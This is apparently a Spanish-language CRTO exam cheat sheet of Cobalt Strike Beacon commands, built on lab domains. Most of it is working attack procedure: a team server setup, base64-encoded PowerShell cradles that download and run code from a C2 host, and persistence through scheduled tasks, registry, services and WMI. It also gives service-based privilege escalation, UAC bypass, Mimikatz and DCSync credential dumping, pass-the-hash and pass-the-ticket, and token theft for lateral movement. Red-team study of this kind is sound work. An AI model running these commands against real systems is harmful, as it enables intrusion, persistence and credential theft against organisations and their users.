# CRTO

# MISC - Commands

## Command & Control
```r
[Unit]
Description=Cobalt Strike Team Server
After=network.target
StartLimitIntervalSec=0

[Service]
Type=simple
Restart=always
RestartSec=1
User=root
WorkingDirectory=/home/attacker/cobaltstrike
ExecStart=/home/attacker/cobaltstrike/teamserver 10.10.5.50 Passw0rd! c2-profiles/normal/webbug.profile

[Install]
WantedBy=multi-user.target

attacker@ubuntu> sudo systemctl daemon-reload
attacker@ubuntu> sudo systemctl status teamserver.service
attacker@ubuntu> sudo systemctl start teamserver.service
attacker@ubuntu> sudo systemctl enable teamserver.service
```

## Files
```r
# Gestión de archivos y directorios en Beacon

# Listar los archivos en el directorio especificado.
beacon> ls <C:\Path>

# Cambiar al directorio de trabajo especificado.
beacon> cd [directory]

# Eliminar un archivo o carpeta.
beacon> rm [file\folder]

# Copiar un archivo.
beacon> cp [src] [dest]

# Descargar un archivo desde la ruta en el host de Beacon.
beacon> download [C:\filePath]

# Listar las descargas en progreso.
beacon> downloads

# Cancelar una descarga en progreso.
beacon> cancel [*file*]

# Subir un archivo desde el atacante al host actual de Beacon.
beacon> upload [/path/to/file]
beacon> upload C:\Temp\payload.txt
```
## Common Commands 
```r
|------------------|---------------------------------------------------------------------------------|
| Comando          | Descripción                                                                     |
|------------------|---------------------------------------------------------------------------------|
| `help`           | Listado de los comandos disponibles.                                            |
| `help <module>`  | Muestra el menú de ayuda del módulo seleccionado.                               |
| `jobs`           | Lista los trabajos en ejecución de Beacon.                                      |
| `jobkill <id>`   | Finaliza el trabajo seleccionado.                                               |
| `run`            | Ejecuta comandos del sistema operativo utilizando llamadas a la API de Win32.   |
| `shell`          | Ejecuta comandos del sistema operativo iniciando "cmd.exe /c".                  |
| `drives`         | Lista las unidades actuales del sistema.                                        |
| `getuid`         | Obtiene el UID del usuario actual.                                              |
| `sleep`          | Configura el intervalo y el jitter de las devoluciones de llamada de Beacon.    |
| `reg`            | Consulta el Registro.                                                           |
|------------------|---------------------------------------------------------------------------------|
```

## Powershell Commands
Diferentes formas de correr Powershell.
```r
# Importar un script de PowerShell .ps1 desde el servidor de control y guardarlo en memoria en Beacon.
beacon > powershell-import [/path/to/script.ps1]

# Configurar un servidor TCP local vinculado a localhost y descargar el script importado anteriormente usando powershell.exe. Luego se ejecuta la función especificada con los argumentos proporcionados y se devuelve la salida.
beacon > powershell [commandlet] [arguments]

# Lanzar la función dada usando Unmanaged PowerShell, que no inicia powershell.exe. El programa usado es el definido por spawnto (OPSEC).
beacon > powerpick [commandlet] [argument]

# Inyectar Unmanaged PowerShell en un proceso específico y ejecutar el comando especificado. Esto es útil para trabajos de PowerShell de larga duración.
beacon > psinject [pid] [arch] [commandlet] [arguments]
```

## .NET Remote Execution
Ejecutar un ejecutable .NET local como un trabajo de post-explotación en Beacon.
**Requisito:** Binarios compilados con la configuración "Any CPU".
```r
beacon > execute-assembly [/path/to/script.exe] [arguments]
beacon > execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe
[*] Tasked beacon to run .NET program: Rubeus.exe
[+] host called home, sent: 318507 bytes
[+] received output:

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v1.4.2 
```

## Other commands
```r
# Ejecutar un servidor web con Python3
$ python3 -m http.server

# Verificar el acceso saliente hacia el TeamServer
$ iwr -Uri http://nickelviper.com/a

# Cambiar reglas de firewall entrantes
beacon> powerpick New-NetFirewallRule -DisplayName "8080-in" -Profile Domain -Direction Inbound -Action Allow -Protocol TCP -LocalPort 8080
beacon> powerpick Remove-NetFirewallRule -DisplayName "8080-in"
```

---
# Host Reconnaissance
```r
# Identificar procesos en ejecución como AV, EDR o cualquier solución de monitoreo y registro.
beacon> ps

# Usar Seatbelt para enumerar información sobre el sistema.
beacon> execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Release\Seatbelt.exe -group=system

# Captura de pantalla.
beacon> screenshot

# Portapapeles.
beacon> clipboard

# Sesiones de usuario.
beacon> net logons

# Keylogger.
beacon> keylogger
```

---
# Host Persistance (Normal + Privileged)
```r
# Ubicación predeterminada de PowerShell.
C:\windows\syswow64\windowspowershell\v1.0\powershell
C:\Windows\System32\WindowsPowerShell\v1.0\powershell

# Codificar el payload de PowerShell en Windows.
PS C:\> $str = 'IEX ((new-object net.webclient).downloadstring("http://nickelviper.com/a"))'
PS C:\> [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($str))

SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwBuAGkAYwBrAGUAbAB2AGkAcABlAHIALgBjAG8AbQAvAGEAIgApACkA

# Codificar el payload de PowerShell en Linux.
$ echo -n "IEX(New-Object Net.WebClient).downloadString('http://nickelviper.com/a')" | iconv -t UTF-16LE | base64 -w 0
```

## Persistance (Normal)
### **MISC - SharpUp**
https://github.com/mandiant/SharPersist
```r
# Listar persistencias.
beacon> execute-assembly C:\Tools\SharPersist\SharPersist\bin\Release\SharPersist.exe -t schtaskbackdoor -m list
beacon> execute-assembly C:\Tools\SharPersist\SharPersist\bin\Release\SharPersist.exe -t startupfolder -m list
beacon> execute-assembly C:\Tools\SharPersist\SharPersist\bin\Release\SharPersist.exe -t schtask -m list

# Técnicas de persistencia (-t).
- `keepass` - backdoor keepass config file
- `reg` - registry key addition/modification
- `schtaskbackdoor` - backdoor scheduled task by adding an additional action to it
- `startupfolder` - lnk file in startup folder
- `tortoisesvn` - tortoise svn hook script
- `service` - create new windows service
- `schtask` - create new scheduled task
```

### **Task Scheduler**
Este comando usa SharPersist para agregar una tarea programada (schtask) que se ejecuta cada hora.
```r
beacon> execute-assembly C:\Tools\SharPersist\SharPersist\bin\Release\SharPersist.exe -t schtask -c "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -a "-nop -w hidden -enc BASE64" -n "Updater" -m add -o hourly

# Remover persistencia en la tarea.
beacon> execute-assembly C:\Tools\SharPersist\SharPersist\bin\Release\SharPersist.exe -t schtask -n "Updater" -m remove
```

### **Startup Folder**
Este comando utiliza SharPersist para instalar persistencia mediante la **carpeta de inicio** del usuario. Lo que se consigue es que, cada vez que el usuario inicie sesión, se ejecute un archivo (o shortcut) llamado "UserEnvSetup" que lanza PowerShell con los parámetros indicados.
```r
beacon> execute-assembly C:\Tools\SharPersist\SharPersist\bin\Release\SharPersist.exe -t startupfolder -c "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -a "-nop -w hidden -enc BASE64" -f "UserEnvSetup" -m add

# Remover persistencia en el acceso directo del StartUp.
beacon> execute-assembly C:\Tools\SharPersist\SharPersist\bin\Release\SharPersist.exe -t startupfolder -f "UserEnvSetup" -m remove
```

### **RegistryAutoRun**
Este comando usa SharPersist para agregar una entrada de persistencia en el registro, específicamente en la key `hkcurun` (que se refiere a HKCU\Run). Esto hace que el ejecutable `Updater.exe` se ejecute automáticamente al iniciar sesión.
```r
beacon> cd C:\ProgramData
beacon> upload C:\Payloads\http_x64.exe
beacon> mv http_x64.exe updater.exe
beacon> execute-assembly C:\Tools\SharPersist\SharPersist\bin\Release\SharPersist.exe -t reg -c "C:\ProgramData\Updater.exe" -a "/q /n" -k "hkcurun" -v "Updater" -m add

# Remover persistencia en el registro.
beacon> execute-assembly C:\Tools\SharPersist\SharPersist\bin\Release\SharPersist.exe -t reg -k "hkcurun" -v "Updater" -m remove
```

### **COM Hijack**
https://dcollao.pages.dev/CRTO/5/L6r5/#hunting-for-com-hijacks

## Persistance (Privileged  SYSTEM user)

### **Windows Services**
Esta técnica establece persistencia creando un servicio de Windows.
```r
beacon> cd C:\Windows
beacon> upload C:\Payloads\tcp-local_x64.svc.exe
beacon> mv tcp-local_x64.svc.exe legit-svc.exe

beacon> execute-assembly C:\Tools\SharPersist\SharPersist\bin\Release\SharPersist.exe -t service -c "C:\Windows\legit-svc.exe" -n "legit-svc" -m add
```

### **WMI Event Subscriptions**
Este conjunto de comandos crea un evento WMI malicioso para lograr persistencia. Básicamente, se sube un payload a la carpeta de Windows y luego se registra un evento WMI que se dispara cuando se inicia el proceso `notepad.exe`
```r
beacon> cd C:\Windows
beacon> upload C:\Payloads\dns_x64.exe
beacon> powershell-import C:\Tools\PowerLurk.ps1
beacon> powershell Register-MaliciousWmiEvent -EventName WmiBackdoor -PermanentCommand "C:\Windows\dns_x64.exe" -Trigger ProcessStart -ProcessName notepad.exe
```

#### **MISC - WMI Event Subscriptions**
```r
# Iniciar el Beacon.
beacon> checkin

# Verificar el nombre del evento [event_name].
beacon> powershell Get-WmiEvent -Name WmiBackdoor

# Eliminar el nombre del evento [event_name].
beacon> powershell Get-WmiEvent -Name WmiBackdoor | Remove-WmiObject.
```

---
# Privilege Escalation
**Nota**: Usar Beacon TCP para la escala de privilegios.

## **MISC - Privilege Escalation**
```r
# Listar todos los servicios y la ruta hacia sus ejecutables.
beacon> run wmic service get name, pathname

# Listar servicios.
beacon> powershell Get-Service | fl

# Mostrar ACL de directorio.
beacon> powershell Get-Acl -Path "C:\Program Files\Vulnerable Services" | fl

# Use SharpUp to find exploitable services.
beacon> execute-assembly C:\Tools\SharpUp\SharpUp\bin\Release\SharpUp.exe audit
```

## **Unquoted Service Paths**
Esta técnica explota una mala configuración en los servicios de Windows que no usan comillas en la ruta del ejecutable. Si la ruta contiene espacios, Windows podría ejecutar un binario malicioso que coloques en el mismo directorio y con un nombre similar, en lugar del ejecutable legítimo.
```r
# Explotar Unquoted Service Path con Cobalt Strike

# 1. Auditar servicios vulnerables a rutas de servicios sin comillas (Unquoted Service Path).
beacon> execute-assembly C:\Tools\SharpUp\SharpUp\bin\Release\SharpUp.exe audit UnquotedServicePath

# 2. Verificar los permisos del directorio del servicio vulnerable.
beacon> powershell Get-Acl -Path "C:\Program Files\Vulnerable Services" | fl

# 3. Cambiar al directorio del servicio vulnerable y listar los archivos.
beacon> cd C:\Program Files\Vulnerable Services
beacon> ls

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
 5kb      fil     02/23/2021 15:04:13   Service 1.exe
 5kb      fil     02/23/2021 15:04:13   Service 2.exe
 5kb      fil     02/23/2021 15:04:13   Service 3.exe

# 4. Subir el payload al directorio del servicio vulnerable.
beacon> upload C:\Payloads\tcp-local_x64.svc.exe

# 5. Renombrar el payload para reemplazar un archivo ejecutable del servicio.
beacon> mv tcp-local_x64.svc.exe Service.exe

# 6. Reiniciar el servicio vulnerable para ejecutar el payload.
beacon> run sc stop VulnService1
beacon> run sc start VulnService1

# 7. Verificar la conexión establecida por el payload.
beacon> run netstat -anp tcp

# 8. Conectar al payload en el puerto configurado (ejemplo: 4444).
beacon> connect localhost 4444
```

## **Weak Service Permission**
Esta técnica se aprovecha de permisos débiles en servicios de Windows, permitiéndote modificar el binPath de un servicio vulnerable para reemplazar su ejecutable con tu payload. Con esto, tras reiniciar el servicio, se lanza tu binario malicioso y te abre la shell.
```r
# Explotar servicios con permisos modificables (Modifiable Services)

# 1. Auditar servicios vulnerables con permisos modificables.
beacon> execute-assembly C:\Tools\SharpUp\SharpUp\bin\Release\SharpUp.exe audit ModifiableServices

# 2. Importar un script para revisar permisos de los servicios.
beacon> powershell-import C:\Tools\Get-ServiceAcl.ps1

# 3. Verificar los permisos del servicio objetivo (VulnService2).
beacon> powershell Get-ServiceAcl -Name VulnService2 | select -expand Access

# 4. Confirmar los detalles de configuración del servicio.
beacon> run sc qc VulnService2

# 5. Preparar un directorio temporal para cargar el payload.
beacon> mkdir C:\Temp
beacon> cd C:\Temp

# 6. Subir el payload al sistema objetivo.
beacon> upload C:\Payloads\tcp-local_x64.svc.exe

# 7. Configurar el servicio vulnerable para usar el payload.
beacon> run sc config VulnService2 binPath= C:\Temp\tcp-local_x64.svc.exe

# 8. Verificar la nueva configuración del servicio.
beacon> run sc qc VulnService2

# 9. Reiniciar el servicio para ejecutar el payload.
beacon> run sc stop VulnService2
beacon> run sc start VulnService2

# 10. Verificar conexiones establecidas por el payload.
beacon> run netstat -anp tcp

# 11. Conectar al payload en el puerto configurado (ejemplo: 4444).
beacon> connect localhost 4444
```

## **Weak Service Binary Permissions**
Esta técnica explota permisos débiles sobre el binario de un servicio. Si el archivo ejecutable del servicio es modificable, puedes reemplazarlo con tu payload malicioso, de modo que al reiniciar el servicio se ejecute tu binario en lugar del legítimo.
```r
# Explotar servicios con permisos modificables (Modifiable Services) - Reemplazo directo del binario

# 1. Auditar servicios con configuraciones modificables.
beacon> execute-assembly C:\Tools\SharpUp\SharpUp\bin\Release\SharpUp.exe audit ModifiableServices

# 2. Verificar los permisos del binario asociado al servicio vulnerable.
beacon> powershell Get-Acl -Path "C:\Program Files\Vulnerable Services\Service 3.exe" | fl

# 3. Preparar el payload para reemplazar el binario original.
PS C:\Payloads> copy "tcp-local_x64.svc.exe" "Service 3.exe"

# 4. Detener el servicio para reemplazar el binario.
beacon> run sc stop VulnService3

# 5. Subir el payload renombrado al sistema remoto.
beacon> cd "C:\Program Files\Vulnerable Services"
beacon> upload C:\Payloads\Service 3.exe

# 6. Iniciar el servicio para ejecutar el payload.
beacon> run sc start VulnService3

# 7. Verificar conexiones establecidas por el payload.
beacon> run netstat -anp tcp

# 8. Conectar al payload en el puerto configurado (ejemplo: 4444).
beacon> connect localhost 4444
```

## **UAC Bypass**
```r
# Elevar privilegios utilizando UAC bypass con schtasks en Beacon

beacon> run whoami /groups
beacon> elevate uac-schtasks tcp-local
```

---

# Credential Theft

## **Mimikatz**
```r
# El símbolo '!' se usa para ejecutar un comando en el contexto elevado del System User.
# El símbolo '@' se usa para suplantar el token de thread de Beacon.

# Volcar la base de datos SAM local.
# Contiene hashes NTLM de las cuentas locales.
beacon> mimikatz !lsadump::sam

# Volcar las contraseñas de logon (Plain Text + Hashes) desde LSASS.exe.
# Incluye contraseñas en texto claro y hashes NTLM de los usuarios autenticados.
# Las credenciales se almacenan en Cobalt Strike: View > Credentials.
beacon> mimikatz !sekurlsa::logonpasswords

# Volcar las claves de cifrado utilizadas por Kerberos de los usuarios autenticados.
# Solo funciona con claves AES256.
# Las credenciales deben añadirse manualmente en Cobalt Strike: View > Credentials > Add.
beacon> mimikatz !sekurlsa::ekeys

# Volcar las Domain Cached Credentials (DCC).
# No son útiles para movimiento lateral directo, pero pueden ser crackeadas.
beacon> mimikatz !lsadump::cache
# Formato Hashcat para DCC: $DCC2$<iterations>#<username>#<hash>

# Volcar el hash de KRBTGT desde el Domain Controller localmente.
# El hash de KRBTGT es fundamental para ataques como Golden Ticket.
beacon> mimikatz !lsadump::lsa /inject /name:krbtgt

```

## **Rubeus**
```r
# Listar los tickets de Kerberos en caché en la sesión de logon actual o en todas las sesiones de logon (requiere sesión privilegiada*).
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe triage

# Volcar/Dumpear el TGT Ticket de la sesión de logon especificada (LUID).
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:0x5285c /service:krbtgt /nowrap
```

## **DCSync**
```r
#Realizar DC Sync Attack (nlamb es una cuenta de Domain Admin).
beacon> make_token DEV\nlamb F3rrari
beacon> dcsync dev.cyberbotic.io DEV\krbtgt
```

---
# Domain Recon

## **PowerView**
```r
# Importar PowerView.ps1.
beacon> powershell-import C:\Tools\PowerSploit\Recon\PowerView.ps1  

# Obtener información del dominio (Actual/Específico). 
# Devuelve un objeto de dominio para el dominio actual o el dominio especificado con `-Domain`.  
beacon> powerpick Get-Domain  
beacon> powerpick Get-Domain -Domain "dc-2.dev.cyberbotic.io"  

# Obtener el SID del dominio.  
beacon> powerpick Get-DomainSID  

# Obtener el Domain Controller.  
# Devuelve los Domain Controller para el dominio actual o especificado.  
beacon> powerpick Get-DomainController | select Forest, Name, OSVersion | fl  

# Obtener información del Forest.  
# Devuelve todos los dominios para el forest actual o el forest especificado por `-Forest`.  
beacon> powerpick Get-ForestDomain  
beacon> powerpick Get-ForestDomain -Forest ""  

# Obtener el Domain Policy.
#Devuelve la política de dominio predeterminada o la política del Domain Controlleer para el dominio actual o un dominio/controlador de dominio especificado.  
beacon> powerpick Get-DomainPolicyData | select -expand SystemAccess  

# Obtener usuarios del dominio.  
# Devuelve todos los usuarios (o usuarios específicos). Para devolver solo propiedades específicas, usa `-Properties`, usa `-Identity` para devolver un usuario específico.  
beacon> powerpick Get-DomainUser -Identity jking -Properties DisplayName, MemberOf | fl  
beacon> powershell Get-DomainUser -Identity jking | fl  
beacon> powershell Get-DomainUser | fl  
beacon> powershell Get-DomainUser -Properties DisplayName, MemberOf | fl  

# Identificar usuarios Kerberoastable/AS-REPRoastable/Unconstrained Delegation.  
beacon> powerpick Get-DomainUser | select cn,serviceprincipalname  
beacon> powerpick Get-DomainUser -PreauthNotRequired  
beacon> powerpick Get-DomainUser -TrustedToAuth  

# Obtener computadoras del dominio.  
#Devuelve todas las computadoras o objetos específicos de computadoras.  
beacon> powerpick Get-DomainComputer -Properties DnsHostName | sort -Property DnsHostName  

# Identificar cuentas de computadoras donde la delegación unconstrained y constrained está habilitada. 
beacon> powerpick Get-DomainComputer -Unconstrained | select cn, dnshostname  
beacon> powerpick Get-DomainComputer -TrustedToAuth | select cn, msdsallowedtodelegateto  

# Obtener unidades organizativas (OU) del dominio.  
# Busca todas las unidades organizativas (OUs) o objetos específicos de OU.  
beacon> powerpick Get-DomainOU -Properties Name | sort -Property Name  

# Identificar computadoras en una OU específica.  
beacon> powerpick Get-DomainComputer -SearchBase "OU=Workstations,DC=dev,DC=cyberbotic,DC=io" | select dnsHostName  

# Obtener grupos del dominio (Usar la bandera -Recurse).  
# Devuelve todos los grupos de dominio o objetos específicos de grupos de dominio.  
beacon> powerpick Get-DomainGroup | where Name -like "*Admins*" | select SamAccountName  
beacon> powerpick Get-DomainGroup | select SamAccountName  


# Obtener miembros de un grupo del dominio.  
# Devuelve los miembros de un grupo de dominio específico.  
beacon> powerpick Get-DomainGroupMember -Identity "Domain Admins" | select MemberDistinguishedName  
beacon> powerpick Get-DomainGroupMember -Identity "Domain Admins" -Recurse | select MemberDistinguishedName  

# Obtener los GPOs del dominio.  
# Devuelve todos los Group Policy Objects (GPOs) o objetos específicos de GPO. Para enumerar una máquina en particular, usa `-ComputerIdentity`.  
beacon> powerpick Get-DomainGPO -Properties DisplayName | sort -Property DisplayName  
beacon> powershell Get-DomainGPO -ComputerIdentity "" -Properties DisplayName | sort -Property DisplayName  

# Encontrar el sistema donde se aplican los GPOs específicos.  
beacon> powerpick Get-DomainOU -GPLink "{AD2F58B9-97A0-4DBC-A535-B4ED36D5DD2F}" | select distinguishedName  

# Identificar usuarios/grupos del dominio con permisos de administrador local a través de Restricted Groups o GPO.  
# Devuelve todos los GPOs que modifican la membresía de grupos locales a través de Restricted Groups o Group Policy Preferences. Puedes encontrar manualmente a qué OUs, y por extensión a qué computadoras, se aplican estos GPOs.  
beacon> powerpick Get-DomainGPOLocalGroup | select GPODisplayName, GroupName  

# Enumerar máquinas donde un usuario/grupo del dominio tiene permisos de administrador local.  
# Enumera las máquinas donde un usuario/grupo específico del dominio es miembro de un grupo local específico.  
beacon> powerpick Get-DomainGPOUserLocalGroupMapping -LocalGroup Administrators | select ObjectName, GPODisplayName, ContainerName, ComputerName | fl  

# Obtener trusts del dominio.  
# Devuelve todos los trusts de dominio para el dominio actual o especificado.  
beacon> powerpick Get-DomainTrust  

# Encontrar acceso de administrador local en otras computadoras del dominio basado en el contexto del usuario actual.  
beacon> powerpick Find-LocalAdminAccess  
beacon> powerpick Invoke-CheckLocalAdminAccess -ComputerName <server_fqdn>  

#Este comando  busca y enumera usuarios en el dominio o sistema que pueden ser objetivos interesantes para lateral movement o escalación. Básicamente, te ayuda a identificar cuentas potencialmente valiosas.
beacon> powerpick Invoke-UserHunter  

# Con este comando, se verifica si tienes acceso de administrador local en el servidor especificado utilizando PS Remoting. Es decir, te ayuda a ver si puedes ejecutar comandos de forma remota con privilegios elevados.
beacon> powerpick Find-PSRemotingLocalAdminAccess -ComputerName <server_fqdn>

# Similar al anterior, pero esta vez se usa WMI para chequear la existencia de privilegios administrativos locales en el servidor objetivo. Esto te da otra vía para confirmar si puedes moverte lateralmente aprovechando los permisos disponibles.
beacon> powerpick Find-WMILocalAdminAccess -ComputerName <server_fqdn>  
```

## **SharpView**
```r
beacon> execute-assembly C:\Tools\SharpView\SharpView\bin\Release\SharpView.exe Get-Domain
```

## **ADSearch**
```r
# Buscar todos los usuarios.
beacon> execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "objectCategory=user"

#Buscar todos los grupos.
beacon> execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "objectCategory=group"

# Filtrar por grupo y buscar miembros.
beacon> execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(&(objectCategory=group)(cn=MS SQL Admins))" --attributes cn,member

# Listar Kerberostable Users.
beacon> execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(&(objectCategory=user)(servicePrincipalName=*))" --attributes cn,servicePrincipalName,samAccountName

# Listar ASREP-ROAST Users.
beacon> execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(&(objectCategory=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" --attributes cn,distinguishedname,samaccountname

# Listar Unconstrained Delegation.
beacon> execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname,dnshostname

# Listar Constrained Delegation.
beacon> execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(&(objectCategory=computer)(msds-allowedtodelegateto=*))" --attributes dnshostname,samaccountname,msds-allowedtodelegateto --json
```

# User Impersonation

## **Pass the Hash Attack**
Pass the hash es una técnica que te permite autenticarte en un servicio de Windows utilizando el NTLM hash de la contraseña de un usuario. `Este comando requiere privilegios elevados`.
```r
# PTH (Pass the Hash) usando el método incorporado en Cobalt Strike

# 1. Verificar la identidad actual del Beacon.
beacon> getuid

# 2. Intentar acceder a un recurso remoto utilizando las credenciales actuales.
beacon> ls \\web.dev.cyberbotic.io\c$
[-] could not open \\web.dev.cyberbotic.io\c$\*: 5 - ERROR_ACCESS_DENIED

# 3. Realizar un Pass the Hash (PTH) para suplantar a un usuario conocido con su hash NTLM.
# En este caso, `DEV\jking` es el usuario objetivo y se utiliza su hash NTLM.
beacon> pth DEV\jking 59fc0f884922b4ce376051134c71e22c
# Después de ejecutar este comando, el Beacon usará el token generado para actuar como `DEV\jking`.

# 4. Verificar si ahora se tiene acceso al recurso remoto.
beacon> ls \\web.dev.cyberbotic.io\c$
# Si las credenciales de `DEV\jking` tienen privilegios suficientes, este comando debería listar el contenido del recurso compartido.

# 5. Buscar acceso de administrador local en el sistema remoto.
# Utilizar el módulo `Find-LocalAdminAccess` para identificar si el usuario tiene privilegios de administrador en el sistema remoto.
beacon> powerpick Find-LocalAdminAccess -ComputerName web.dev.cyberbotic.io

# 6. Revertir la identidad al token original del Beacon.
# Útil para limpiar rastros y restaurar el contexto original.
beacon> rev2self
```

## **Pass the Ticket Attack** 
Es una técnica que te permite agregar tickets Kerberos a una sesión de inicio de sesión existente (LUID) a la que tengas acceso, o a una nueva que crees.`Crear una nueva sesión de inicio de sesión y pasar tickets a sesiones que no sean las tuyas requiere privilegios elevados.` El ticket lo utilizando `triage` y `dump`. 
```r
# Agregar y utilizar tickets Kerberos en sesiones existentes o nuevas

# 1. Identificar los tickets de Kerberos activos en la memoria.
# Este comando lista todos los tickets almacenados en caché en la sesión de logon actual o en todas las sesiones disponibles (requiere privilegios elevados para ver todas las sesiones).
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe triage
# Ejemplo de salida:
# | 0x7049f | jking @ DEV.CYBERBOTIC.IO | krbtgt/DEV.CYBERBOTIC.IO | 9/1/2022 5:29:20 PM |
# En este caso, el LUID es `0x7049f`, el usuario es `jking`, y el ticket es un TGT para el dominio `DEV.CYBERBOTIC.IO`.

# 2. Dumpear el TGT asociado a una sesión de logon específica (LUID).
# Este comando extrae el Ticket Granting Ticket (TGT) correspondiente al LUID especificado. 
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:0x7049f /service:krbtgt /nowrap
# Ejemplo de ticket extraído:
# doIFuj [...snip...] lDLklP
# Guarda este ticket para su uso posterior.

# 3. Crear una nueva sesión de logon "sacrificial".
# Este comando crea una nueva sesión aislada con `createnetonly`, útil para inyectar un ticket sin interferir con las sesiones activas.
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:dev.cyberbotic.io /username:bfarmer /password:FakePass123
# Ejemplo de salida:
# LUID generado: `0x798c2c`. Anota este LUID para el próximo paso.

# 4. Inyectar el TGT en la nueva sesión.
# Utiliza el LUID generado por el comando anterior y el ticket dumpeado en el paso 2.
# Esto permite usar el ticket en la nueva sesión creada.
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe ptt /luid:0x798c2c /ticket:doIFuj[...snip...]lDLklP
# Ahora el ticket está asociado a la sesión de logon sacrificial.

# 5. Verificar que el TGT está activo en la nueva sesión.
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe triage
# Verifica que el ticket esté vinculado al LUID `0x798c2c`.

# 6. Suplantar el token de la sesión con el nuevo TGT.
# Usa el PID del proceso creado con `createnetonly` para suplantar la identidad asociada al ticket.
beacon> steal_token 4748

# 7. Realizar operaciones con el token suplantado.
beacon> ls \\dc-2.dev.cyberbotic.io\c$

# 8. Revertir al token original del Beacon o finalizar el proceso sacrificial.
beacon> rev2self
beacon> kill 4748
```

## **Overpass the Hash Attack**
Es una técnica que nos permite solicitar un TGT de Kerberos para un usuario, utilizando su hash NTLM o AES.`Se requieren privilegios elevados para obtener los hashes de los usuarios, pero no para solicitar el ticket.`
Rubeus `asktgt` nos cubre para esta tarea.  **Este TGT luego puede ser aprovechado mediante Pass the Ticket.**

```r
# Solicitar un TGT usando Rubeus con hash NTLM o AES para un ataque Pass the Ticket (PtT)

# 1. Solicitar un TGT para la cuenta `jking` usando su hash NTLM.
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:jking /ntlm:59fc0f884922b4ce376051134c71e22c /nowrap

# 2. Solicitar un TGT con hash AES256 para mejor OPSEC.
# Usar las flags `/domain` y `/opsec` para minimizar huellas en el entorno.
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:jking /aes256:4a8a74daad837ae09e9ecc8c2f1b89f960188cb934db6d4bbebade8318ae57c6 /domain:DEV /opsec /nowrap
doIFuj [...snip...] ljLmlv

# 3. Usar el TGT obtenido para realizar un ataque Pass the Ticket (PtT).
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:dev.cyberbotic.io /username:bfarmer /password:FakePass123 /ticket:doIFuj [...snip...] ljLmlv
```

## **Token Impersonation**
Esta técnica funciona obteniendo un handle al proceso objetivo, abriendo y duplicando su token de acceso primario y luego suplantando ese token.
```r
# Suplantación de tokens mediante el comando `steal_token`

# 1. Identificar el proceso objetivo y su usuario asociado.
beacon> ps

 PID   PPID  Name                                   Arch  Session     User
 ---   ----  ----                                   ----  -------     ----
 5536  1020  mmc.exe                                x64   0           DEV\jking

# 2. Robar el token primario del proceso objetivo.
beacon> steal_token 5536

# 3. Verificar permisos accediendo a un recurso remoto utilizando el token suplantado.
beacon> ls \\web.dev.cyberbotic.io\c$
[*] Listing: \\web.dev.cyberbotic.io\c$\

# 4. Si el usuario (DEV\jking) tiene permisos en el sistema remoto, realizar movimiento lateral hacia él.
beacon> jump psexec64 web.dev.cyberbotic.io smb
```

## **Token Store**
 Esta es una evolución del comando steal_token que permite robar y almacenar tokens para uso futuro.
```r
# Administración avanzada de tokens con `token-store`

# 1. Robar y almacenar un token para uso futuro.
beacon> token-store steal 5536
[*] Stored Tokens

 ID   PID   User
 --   ---   ----
 0    5536  DEV\jking

# 2. Listar todos los tokens almacenados.
beacon> token-store show

# 3. Impersonar un token almacenado utilizando su ID.
beacon> token-store use 0
[+] Impersonated DEV\jking

# 4. Revertir al token original del Beacon.
beacon> rev2self
[*] Tasked beacon to revert token

# 5. Remover un token específico del almacén.
beacon> token-store remove <id>

# 6. Remover todos los tokens almacenados.
beacon> token-store remove-all

```

## **Make Token**
El comando `make_token` te permite impersonar a un usuario si conoces su contraseña en texto plano.
```r
# Impersonar usuarios con `make_token`

# 1. Usar `make_token` para impersonar a un usuario conocido con su contraseña en texto plano.
# Ejemplo con el usuario jking:
beacon> make_token DEV\jking Qwerty123
[+] Impersonated DEV\jking (netonly)

# 2. Verificar la impersonación ejecutando un comando remoto con WinRM.
beacon> remote-exec winrm web.dev.cyberbotic.io whoami
dev\jking

# 3. Impersonar a otro usuario, como mssql_svc, utilizando su contraseña en texto plano.
beacon> make_token DEV\mssql_svc Cyberb0tic

# 4. Verificar la impersonación en otro sistema remoto.
beacon> remote-exec winrm sql-2.dev.cyberbotic.io whoami
dev\mssql_svc
```

